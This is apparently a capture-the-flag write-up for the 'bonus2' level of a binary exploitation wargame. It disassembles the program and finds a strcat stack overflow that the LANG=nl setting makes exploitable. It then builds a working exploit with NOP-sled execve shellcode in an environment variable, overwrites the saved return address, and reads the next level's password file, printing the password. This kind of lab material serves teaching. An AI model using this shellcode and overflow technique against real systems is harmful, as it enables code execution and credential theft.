Execute the *bonus2* binary:

```bash
./bonus2
./bonus2 aaa
./bonus2 aaa bbb
./bonus2 aaa bbb ccc
```

```
Hello aaa
```

> Note that the program work maybe only with 2 arguments.

```gdb
disass main
```

> Use __set disassembly-flavor intel__ command to set the intel syntax.

```

```
; main
...
0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>  ; call the strncpy function for copy n characters from a string
                                                    ; to an another one
                                                    ; [ARG 1] the address of the stack buffer (exp + 80)
                                                    ; [ARG 2] the address of the first user string argument
                                                    ; [ARG 3] 40
...
0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>  ; call the strncpy function for copy n characters from a string
                                                    ; [ARG 1] the stack buffer (exp + 80) + 40
                                                    ; [ARG 2] the address of the second user string argument
                                                    ; [ARG 3] 40
...
0x080485a6 <+125>:	call   0x8048380 <getenv@plt>   ; call the getenv function to get an environment variable
                                                    ; [ARG 1] "LANG" string address
...
0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>   ; call the memcmp function to compare two string
                                                    ; [ARG 1] the string address returned by getenv
                                                    ; [ARG 2] the string addres "fi"
...
0x08048605 <+220>:	call   0x8048360 <memcmp@plt>       ; call the memcmp function to compare two string
                                                        ; [ARG 1] the string address returned by getenv
                                                        ; [ARG 2] the string addres "nl"
...
0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]  ; copy the 19 first characters of the
                                                                    ; returned string from the getenv call
                                                                    ; to the buffer stack (esp + 80)
0x0804862b <+258>:	call   0x8048484 <greetuser>    ; call the custom greetuser function
...
```

```gdb
disass greetuser
```

```
...
0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx          ; put the string "Hell" part of the string "Hello " address from edx in eax (by value)
0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]       ; put the string "o " part of the string "Hello " address from edx (+4) in ecx (by value)
0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx        ; put the string "o " part of the string "Hello " address from cx  in eax (+4) (by value)
...
0x08048517 <+147>:	call   0x8048370 <strcat@plt>       ; call the strcat function to copy a string into an another one
                                                        ; [ARG 1] the address of a stack buffer
                                                        ; [ARG 2] the first argument of the function
...
0x08048522 <+158>:	call   0x8048390 <puts@plt>         ; call the puts function to print a string
                                                        ; [ARG 1] the pointer to string result of the strcat call
...
```

After desassembling the binary to understand it:
- If there are not 3 arguments, the program stop.
- Copy the first 40 bytes of the first user argument in the first buffer.
- Copy the the first 32 bytes of the second user argument in a the rest of the first buffer.
- Get the value of the "LANG" environment variable.
- If the value of the "LANG" environment variable is "":
    * concatenate "Hello " and the first buffer of 80 bytes together in the second buffer.
- If the value of the "LANG" environment variable is "fi":
    * concatenate "Hyvää päivää " and the first buffer of 80 bytes together in the second buffer.
- If the value of the "LANG" environment variable is "nl":
    * concatenate "Goedemiddag! " and the first buffer of 80 bytes together in the second buffer.
- Print the second buffer in the output.

Let's try to overflow the stored eip in the stack using the __stract__ function at from the *greetuser* function:

```gdb
run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 1111222233334444555566667777888899990000
```

```
Program received signal SIGSEGV, Segmentation fault.
0x08003838 in ?? ()
```

> Note we can partially overflow the saved eip of the *greetuser* function. The first 4 bytes are from the default return address *0x08048630* ('info stack' in gdb), and the 4 last bytes corresponde to the '...8888...' part of the second user argument.

The goal now is to overflow completely this saved eip of the *greetuser*.

Remember that if the "LANG" environement variable is set to "nl" or "fi", the size of the second buffer which is responsible of the overflow, can increase.

Let's try to overflow like the previous time, with the "nl" value for the "LANG" environment variable.

```bash
export LANG=nl
```

```gdb
run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 1111222233334444555566667777888899990000
```

```
Program received signal SIGSEGV, Segmentation fault.
0x37373736 in ?? ()
```

Now the saved eip of the *greetuser* is completely overflow.

> The *0x37373736* corresponde to the '...6777...' part of the second user argument at the 23rd bytes.

> The size of the first user argument is not important expected it must be greater or equal to 40 bytes.

Export a shellcode with some *nop* instructions:

```
export SHELLCODE=`python -c 'print("\x90" * 300 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'`
```

Get the address where is the shellcode environment variable is stocked using a small program:

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    printf("LANG: %p\n", getenv("LANG"));
    printf("SHELLCODE: %p\n", getenv("SHELLCODE"));
}
```

```bash
vim /tmp/getenv.c
# copy the small program
gcc /tmp/getenv.c -o /tmp/getenv.out
/tmp/getenv.out
```

```
LANG: 0xbffffeee
SHELLCODE: 0xbffff740
```

> The addresses of the environment variables are differents for each expert...

Construct the inputs:

- First argument:
    * 40 random bytes to fill the first part of the buffer
- Second argument:
    * 23 bytes to reach the offset of the saved eip of the *greetuser* function
    * 4  address bytes of the shellcode (reversed...)


```bash
./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa $(echo -e "bbbbbbbbbbbbbbbbbbbbbbb\x40\xf7\xff\xbf")
cat /home/user/bonus3/.pass
```

```
Goedemiddag! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbb@���
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```